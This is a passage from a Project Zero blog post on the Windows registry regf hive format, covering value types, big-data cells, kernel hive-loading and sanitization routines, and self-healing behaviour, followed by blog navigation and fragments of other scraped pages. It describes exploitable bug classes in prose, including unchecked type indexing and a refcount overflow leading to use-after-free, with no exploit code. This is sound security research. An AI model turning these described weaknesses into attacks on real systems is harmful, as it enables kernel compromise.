This field is supposed to store one of the [supported value types](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types), such as REG\_DWORD, REG\_BINARY, etc. We'll omit a thorough discussion of the official types, as we feel they are already well documented and understood. From a strictly technical point of view, though, it's important to note that the type is simply a hint, an extra piece of metadata that is available to a registry client with the intended purpose of indicating the nature of the value. However, Windows provides no guarantees with regards to the consistency between the value type and its data. For instance, a REG\_DWORD value doesn't have to be four-bytes long (even though it conventionally is), a REG\_SZ unicode string can have an odd length, and so on. Any client application that operates on user-controlled data from the registry should always check the specific properties it relies on, instead of unconditionally trusting the value type.

Beyond this flexibility in data interpretation, there's another aspect of the Type field to consider: its potential for misuse due to its 32-bit width. The kernel generally doesn't perform any verification that its numerical value is one of the small, predefined enums (other than to ensure REG\_LINK for symbolic links and REG\_NONE for tombstone values), so it is possible to set it to any arbitrary 32-bit value, and have it returned in exactly the same form by system APIs such as [RegQueryValueEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw). If a program or driver happens to use the value type returned by the system as a direct index into an array without any prior bounds checking, this could lead to out-of-bounds reads or memory corruption. In some sense, it would probably be safest for the most critical/privileged software in the system (e.g. antivirus engines) not to use the value type at all, or only within a very limited scope.

###### Flags

There are currently two supported flags that can be set on registry values:

* VALUE\_COMP\_NAME (0x1) – equivalent to KEY\_COMP\_NAME, indicates that the value name representation is a tightly packed string of ASCII characters.
* VALUE\_TOMBSTONE (0x2) – used exclusively in differencing hives (version 1.6) to indicate that a value with the given name has been explicitly deleted and doesn't exist on this key layer. It requires that the value type is REG\_NONE and it doesn't contain any data. It is equivalent to the Tombstone (1) property of a key set in the LayerSemantics field of a key node.

###### Spare

Unused member, never accessed by the kernel.

##### Big data value storage

Prior to hive version 1.4, the maximum length of a value in the registry was 1 MB, which was directly related to the maximum length of the single backing cell that would store the raw data. This limitation is documented in the [Registry element size limits](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits) article:

| Registry element | Size limit |
| --- | --- |
| Value | * Available memory (latest format) [editor's note: this is not fully accurate] * 1 MB (standard format) |

Here, "standard format" refers to regf v1.3. On some level, 1 MB could be considered a reasonable limit, as the registry was not designed to serve as storage for large quantities of data – at least not initially. One example of a public resource which vocalized this design decision was the old [Windows registry information for advanced users](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users) article from around 2002-2003, which stated:

| Long values (more than 2,048 bytes) must be stored as files with the file names stored in the registry. |
| --- |

Nevertheless, it seems that at some point during the development of Windows XP, Microsoft decided to provide the registry clients with the ability to store larger chunks of data, not bound by the somewhat arbitrary limits of the regf format. In order to facilitate this use case, a new cell type was added, called the "big data". Conceptually, it is simply a means of dividing one long data blob into smaller portions of 16344 bytes, each stored in a separate cell. It replaces the single backing cell with a \_CM\_BIG\_DATA structure defined as follows:

0: kd> dt \_CM\_BIG\_DATA

nt!\_CM\_BIG\_DATA

   +0x000 Signature        : Uint2B

   +0x002 Count            : Uint2B

   +0x004 List             : Uint4B

The signature is set to 0x6264 ('db') and verified on hive load, but otherwise not used. The count represents the number of 16344-byte chunks making up the overall value, and is generally supposed to be set to an integer between 2–65535. Otherwise, if it was set to 0, that would mean that the value is empty so the big data object shouldn't be present at all. If it was equal to 1, a direct backing buffer should have been used instead, so such a construct would also be invalid. Neither zero nor one are thus accepted by the hive loader, but it is technically possible to set these values at runtime by abusing the aforementioned [integer overflow bug](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow). We haven't found any security impact of this behavior other than it being a correctness error, though.

The last element of the structure, List, is a cell index to a basic array of cell indexes making up the value chunks. Its format is equivalent to that of the value list, which also stores just the HCELL\_INDEX values without any headers or additional information. Furthermore, every chunk other than the last one must contain exactly 16344 bytes. If the length of the overall value is not divisible by 16344, the final chunk contains the remaining 1–16343 bytes. The layout of the big data object and its associated cells is shown in the diagram below:

[![The layout of the big data object and its associated cells](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6SwYri6hkJBoHs5op8qe6mhTYZeVJwH3JnfR3CexiLYMaOE4RbS6EXJNNzysF4f1gs3trpBnid1DTs2UqKIKGj08qppMdJ-eJ7duiFbeC1ASIBYP1PuMi3-XHPCJACC5i093_R141BIAnnXlhGusKX3IXYHgUFIyTuDggoE8oUTFxtFIcuRHde-aaFvM/s1200/image7.png "The layout of the big data object and its associated cells")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6SwYri6hkJBoHs5op8qe6mhTYZeVJwH3JnfR3CexiLYMaOE4RbS6EXJNNzysF4f1gs3trpBnid1DTs2UqKIKGj08qppMdJ-eJ7duiFbeC1ASIBYP1PuMi3-XHPCJACC5i093_R141BIAnnXlhGusKX3IXYHgUFIyTuDggoE8oUTFxtFIcuRHde-aaFvM/s1999/image7.png)

This concludes the part about the internal format of registry hives.

## The hive loading and sanitization process

The hive loading process implemented by the NtLoadKey\* family of system calls is a long and complex operation. It involves opening the hive file, loading it in memory, verifying its integrity, optionally recovering state from transactional log files, allocating any related kernel objects, attaching the hive to the global registry tree, and optionally opening a handle to the hive root and returning it to the caller. In this blog post, we are particularly interested in the hive sanitization part. Understanding this portion of the registry code is like consulting the official specification – or even better, as the code doesn't lie and is essentially the ground truth of what is and isn't accepted as valid data. Furthermore, it provides us with a number of hints as to which properties of the format are imperative to the correct functioning of the database, and which ones are more conventional, and don't have any serious consequences even if broken. The goal of this section is to discuss the overall control flow of loading a hive and performing the initial pass of sanitization. By documenting which internal routines are responsible for which checks, we hope to make it easier for other security researchers to navigate the hive loading code, providing a good starting point for their own investigations.

The registry, as a logical structure, is built on top of several lower-layer abstractions, each of which has a number of invariants that must hold in order for the hive to be considered valid, and in order for operations being performed on the hive to be safe. This is illustrated in the pyramid below, with the most foundational requirements placed at the bottom, and the increasingly more general aspects of hive integrity towards the top:

[![Diagram in the shape of a pyramid, with five levels. The base level showing the hive header, bin and cell layout consistency, and the top level showing Correctness of global hive properties, with all levels described below this image with examples ](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibUVk499wc-Yte1DVLfmcUQYhsQvy6ARBfLsri3Jiov3hZkY5WLsOqMoqkhMcBZkYJsLuKCaDm8eiamtml4qFL3FbrngHqpXVPwFhPXpwaDI5qYh9EHHIdJ0qc2XfCD6IFgOxIeHgsyKMWSuslXaajrOKuJ-GEnc-rzgQb0ohZKfOTAXHjfthXSEHlrCE/s5663/loading_pyramid.png "Diagram in the shape of a pyramid, with five levels. The base level showing the hive header, bin and cell layout consistency, and the top level showing Correctness of global hive properties, with all levels described below this image with examples ")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibUVk499wc-Yte1DVLfmcUQYhsQvy6ARBfLsri3Jiov3hZkY5WLsOqMoqkhMcBZkYJsLuKCaDm8eiamtml4qFL3FbrngHqpXVPwFhPXpwaDI5qYh9EHHIdJ0qc2XfCD6IFgOxIeHgsyKMWSuslXaajrOKuJ-GEnc-rzgQb0ohZKfOTAXHjfthXSEHlrCE/s5663/loading_pyramid.png)

Let's consider some examples of validity checks at each level, starting with the most fundamental ones:

1. Hive header, bin and cell layout consistency
   * Validity of the hive version, length, root cell index, flags in the header.
   * Existence of at least one bin in the hive.
   * Validity of each bin's header, particularly the file offset and size.
   * Validity of cells: aligned to eight bytes, within the bounds of the bin, completely filling out the bin.
2. Intra-cell consistency
   * Sufficient size of each cell with regards to the data it stores: at least the minimum size for the cell type (e.g. 0x4e for the key node), plus adequate to any variable-length internal arrays, such as the key name or value name.
   * Correct signatures being set for every kind of cell depending on its function.
   * Valid combinations of flags being set in key nodes and values.
   * Strings (key names, value names) adhering to the format requirements regarding minimum and maximum lengths, charset, etc.
3. Inter-cell consistency
   * Valid references to cells in cell indexes, and each allocated cell only being used for one specific purpose.
   * Consistency between copies of redundant data in separate cells: e.g. \_CM\_KEY\_NODE.SubKeyCounts[...] vs. the length of the subkey index.
   * Consistency between length markers in one cell vs. the amount of data stored in the corresponding backing buffer (e.g. \_CM\_KEY\_VALUE.DataLength vs. length of the data stored in the raw data cell / big data cell).
   * Correct hints in subkey indexes (fast leaves, hash leaves).
   * Correct reference counts in the security descriptors.
4. Structural correctness of high-level constructs
   * Consistency of the linked list of security descriptors.
   * Subkeys being laid out in a lexicographical order in all subkey indexes.
   * Symbolic link keys having a single value named "SymbolicLinkValue" of type REG\_LINK.
   * Subkeys in the stable space always having a non-volatile parent.
5. Correctness of global hive properties
   * Each hive always containing at least one key (the root key) and at least one security descriptor.
   * Only the root of the hive, and no other key having the KEY\_HIVE\_ENTRY flag set.
   * The depth of the hive's tree structure being a maximum of 512 levels.

As we can see, there are a variety of constraints that require verification when loading a hive, with the more abstract ones relying on the lower-layer ones to be confirmed first. It explains why the process is by far the most complex operation one can perform on the registry, spanning across thousands of lines of code and dozens of functions. To better illustrate this process, I've outlined the most important hive validation functions below, indented to show their hierarchical relationships as they execute in the kernel:

* NtLoadKey\* → CmLoadDifferencingKey → CmLoad(App)Key
  + CmpCmdHiveOpen → CmpInitHiveFromFile → CmpCreateHive
    - HvHiveStartFileBacked → HvLoadHive
      * HvpGetHiveHeader
      * HvAnalyzeLogFiles
      * HvpPerformLogFileRecovery
      * HvpRemapAndEnlistHiveBins
        + HvpValidateLoadedBin
        + HvpEnlistFreeCells
    - CmCheckRegistry
      * HvCheckHive
        + HvCheckBin
      * CmpValidateHiveSecurityDescriptors
      * CmpCheckRegistry2
        + CmpCheckKey
          - CmpCheckValueList
          - CmpCheckLeaf
        + CmpCheckLexicographicalOrder
        + CmpCheckAndFixSecurityCellsRefcount
  + CmpLoadKeyCommon
    - CmpLinkHiveToMaster
      * ObOpenObjectByName → ... <NT Object Manager> ... → CmpParseKey → CmpDoParseKey
        + CmpUpdateHiveRootCellFlags

Here is a short summary of each of the above functions, according to my own analysis and understanding:

| Function name(s) | Description |
| --- | --- |
| NtLoadKey\* | The four syscall entry points for loading registry hives, as discussed in the [previous post](https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html): NtLoadKey, NtLoadKey2, NtLoadKeyEx, NtLoadKey3. |
| CmLoadDifferencingKey | A generic function for loading hives – not just differencing ones but every kind, contrary to what the name might suggest. Other than the syscall handlers, it is also called by VrpPreLoadKey and VrpLoadDifferencingHive, which are parts of the VRegDriver. It is responsible for sanitizing the input flags, checking the privileges of the caller, calling registry callbacks, invoking specialized functions to actually load the hive, and opening a handle to the root of the hive if the caller requested it. |
| CmLoadKey,CmLoadAppKey | Functions implementing the core functionality of loading normal and app hives, respectively. They are responsible for coordinating lower-layer loading functions, resolving any conflicts related to the hive file / registry mount path, and inserting the hive-related objects into the corresponding kernel data structures. In terms of opening and validating the binary hive representation, they are virtually equivalent. |
| CmpCmdHiveOpen,CmpInitHiveFromFile,CmpCreateHive | Functions dedicated to opening the hive file on disk, loading it in memory, validating its integrity and allocating the internal kernel structures (\_CMHIVE and other objects representing the hive). |
| HvHiveStartFileBacked,HvLoadHive | Common functions for loading and sanitizing the hive on the level of header, bins and cells (the lowest level of the pyramid). |
| HvpGetHiveHeader | Reads and validates the hive header, trying to determine if it is valid or corrupted, and whether the header or hive data need to be recovered from a log file. |
| HvAnalyzeLogFiles,HvpPerformLogFileRecovery | Two most important functions related to data recovery from log files: the first one determines which of the two files (.LOG1/LOG2) to use, and the second one actually applies the log file entries to the hive mapping in memory. |
| HvpRemapAndEnlistHiveBins,HvpValidateLoadedBin,HvpEnlistFreeCells | Functions responsible for re-mapping the hive after log file recovery, in order to ensure that every bin is mapped as a continuous block of memory. During the process, the validity of all bins and the layout of their cells is verified. |
| CmCheckRegistry | A generic function encompassing the verification of levels ≥ 2 of the pyramid, i.e. everything about the hive that defines its logical structure and is not related to memory management. If any self-healing occurs during the process, the function restarts its logic, so it may potentially take multiple iterations before a corrupted hive is fixed up and accepted as valid. |
| HvCheckHive,HvCheckBin | Two functions responsible for validating the bin headers and layout of their cells. As you may have noticed, this part of their functionality is redundant with HvpValidateLoadedBin and HvpEnlistFreeCells. The difference is that the earlier functions are used to cache information about the positions of free cells in the hive, to optimize the allocation process later on. On the other hand, the underlying purpose of HvCheckHive and HvCheckBin is to generate a bitmap object (RTL\_BITMAP) that indicates the positions of allocated cells, in order to ensure the validity of cell indexes when sanitizing the hive, and to make sure that every cell is only used for a single purpose in the hive.  As a side note, there is an [amusing bug](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/18_HvCheckBin_incorrect_return_value) in HvCheckBin related to verifying cell size correctness, but it seems to be non-exploitable precisely because the same sanitization is correctly performed earlier in HvpEnlistFreeCells. |
| CmpValidateHiveSecurityDescriptors | The function traverses the linked list of security descriptor cells, and verifies its consistency (the correctness of the Flink/Blink indexes) and the validity of the security descriptor blobs. At the same time, it also caches information about the descriptors in internal kernel structures, so that they can be quickly looked up when verifying the \_CM\_KEY\_NODE.Security fields, and later at system run time. |
| CmpCheckRegistry2 | A function responsible for performing a single attempt at validating the entire key structure. There are several possible return codes:   * STATUS\_SUCCESS if the hive validation passes without problems, * STATUS\_REGISTRY\_HIVE\_RECOVERED if minor corruption was encountered, but it was successfully fixed in-place, * STATUS\_RETRY if a badly corrupted key was encountered and removed from its parent's subkey index. This causes CmCheckRegistry to restart the validation process from scratch. * STATUS\_REGISTRY\_CORRUPT if the hive was found to be corrupted beyond repair. * Other problem-specific error codes such as STATUS\_NO\_LOG\_SPACE or STATUS\_INSUFFICIENT\_RESOURCES, which cause the loading process to be aborted. |
| CmpCheckKey | This is the central function in the hive sanitization process, with more than a thousand lines of code in decompiled output, and likely just as many in the original source code. It essentially checks the validity of all fields within a specific key node, and also orchestrates the validation of the value list and subkey index associated with the key. If there was one function I would recommend analyzing to better understand the regf format, it would be this one. |
| CmpCheckValueList | Checks the consistency of a value list, each of the value cells on the list, and their backing buffers / big data objects. |
| CmpCheckLeaf | Validates a specific leaf subkey index, i.e. one of 'li', 'lf', 'lh'. This includes checking the cell size, signature, validity of the subkey cell indexes and their hint values. |
| CmpCheckLexicographicalOrder | Compares the name of two consecutive subkeys to determine if the second one is lexicographically greater than the first, in order to ensure the right sorting of a subkey index. |
| CmpCheckAndFixSecurityCellsRefcount | Iterates over all security descriptors in the hive, compares their refcounts loaded from disk with the values independently re-calculated while sanitizing the key tree, and corrects them if they are unequal. Since November 2024, it also frees any unused security descriptors with the reference count set to zero (they had been previously allowed, as described in [WinRegLowSeverityBugs issue #10](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/10_CmpKeySecurityIncrementReferenceCount_zero_refcount_crash)). |
| CmpUpdateHiveRootCellFlags | The function makes sure that the root key of the hive has the KEY\_NO\_DELETE and KEY\_HIVE\_ENTRY flags set. Interestingly, these flags are the only aspect of the regf format that is not enforced directly while loading the hive (in CmpCheckKey), but only at a later stage when the hive is being mounted in the global registry view. |

### Self-healing properties

The Windows implementation of the registry has the unique property that it is self-healing: the system tries very hard to successfully load a hive even if it's partially corrupted. My guess is that the reason for this design was to make the mechanism resilient against random data corruption on disk, as failure to load a system hive early during start-up would make Windows unusable. Perhaps it was decided that it was a better tradeoff to forcefully remove the broken parts of the file, with the hope that they would be automatically re-created later at run time, or that they weren't very important to begin with and the system/applications could continue to function correctly without them. And even if not, giving the user a chance to troubleshoot the problem or recover their data would still be a better outcome than bricking the machine completely.

Consequently, whenever an error is detected by the hive loading logic, it is handled in one of several ways, depending on the nature of the problem:

* Bin recreation: if HvpValidateLoadedBin indicates that any part of a bin header is corrupted, then HvpRemapAndEnlistHiveBins re-initializes it from scratch, and declares it as 4096 bytes long (regardless of the previous length).
* Cell recreation: if HvpEnlistFreeCells detects a cell with an invalid length, it converts it to a single free cell spanning from the current offset until the end of the bin, potentially erasing any other data/cells previously residing in that region.
* Small, direct fix: if a single field within a key node is found to have an invalid state, and the good/expected state is known to the kernel, the problem gets fixed by directly overwriting the old value with the correct one. Examples include cell signatures and mandatory/illegal flags.
* Single value deletion: if any inconsistencies are found in a value cell or its associated data cell(s), the specific value is removed from the key's value list.
* Deletion of entire value list: if the descriptor of a value list (i.e. its cell index or length) are invalid, or if a symbolic link contains more than one value, the entire value list of the key is cleared.
* Single key deletion: if an irrecoverable problem is found within a key node (e.g. invalid cell index, invalid cell length, invalid name), then it is removed from its parent's subkey index, and the key tree validation process is restarted from scratch.
* Deletion of entire subkey index: if any irrecoverable problem is found in a subkey index, it is deleted, and the subkey list of its associated key is cleared.
* Security descriptor list reset: if any errors are detected in the list of security descriptors (bad Flink/Blink indexes or invalid binary format), the set of descriptors in the hive is reduced to the single root descriptor, which will then be inherited by all the keys in the hive.
* Rejection of entire hive: if any issues are found with the fundamental parts of the regf format or its properties (heavily corrupted header, missing bins, invalid root key, invalid root security descriptor), the loading of the hive is completely aborted.

As we can see, Windows implements a very defensive strategy and always attempts to either fix the corrupted data, or isolate the damage by deleting the affected object while preserving the overall hive integrity. Only when these repair attempts are exhausted does the kernel abort the loading process and return an error. This resilience can lead to situations where a freshly loaded hive is already in a "dirty" state, requiring the system to immediately flush its self-applied corrections to disk to maintain consistency.

One particularly interesting bug related to the self-healing process was [CVE-2023-38139](https://project-zero.issues.chromium.org/issues/42451601). To reproduce the issue, the self-healing logic would have to be triggered a large number of times (in the case of my PoC, 65535 times) in order to cause a 32-bit integer overflow of a security descriptor refcount, and later a UAF condition. I have also abused the behavior to demonstrate [WinRegLowSeverityBugs #13](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion), in which a key with an empty name would be removed during load, freeing up a reference to a security descriptor and resulting in the refcount being equal to zero upon loading. Overall, the self-healing property of the registry is not the most critical, but one that I find quite fascinating and certainly worth keeping in mind as part of one's toolbox when researching this subsystem.

## Conclusion

Congratulations on reaching the end! This post aimed to systematically explore the inner workings of the regf format, focusing on the hard requirements enforced by Windows. Due to my role and interests, I looked at the format from a strictly security-oriented angle rather than digital forensics, which is the context in which registry hives are typically considered. Hopefully, this deep dive clarifies some of the intricacies of the hive format and complements existing unofficial documentation.

Keep in mind that hives store their data in the regf files on disk, but Windows also creates multiple auxiliary kernel objects for managing and caching this data once loaded. The next post in the series will discuss these various objects, their relationships, lifecycle, and, naturally, their impact on system security. Stay tuned!

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[11:03 AM](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=5470414558693895520&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=pinterest "Share to Pinterest")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2024-12-19T11:03:00-08:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ▼
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ▼
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
    - [The Windows Registry Adventure #5: The regf file f...](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html)
    - [The Qualcomm DSP Driver - Unexpectedly Excavating ...](https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html)
    - [Windows Tooling Updates: OleView.NET](https://googleprojectzero.blogspot.com/2024/12/windows-tooling-updates-oleviewnet.html)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from bugs.chromium.org_8e21cf86_20250115_225533.html ===
[Sign in](https://accounts.google.com/ServiceLogin?passive=1209600&osid=1&continue=https%3A%2F%2Fproject-zero.issues.chromium.org%2Fissues%3Fq%3Dis%253Aopen&followup=https%3A%2F%2Fproject-zero.issues.chromium.org%2Fissues%3Fq%3Dis%253Aopen&ec=GAZAkwI)

=== Content from googleprojectzero.blogspot.com_468cf61e_20250115_225527.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Thursday, December 8, 2022

### [Exploiting CVE-2022-42703 - Bringing back the stack attack](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)

Seth Jenkins, Project Zero

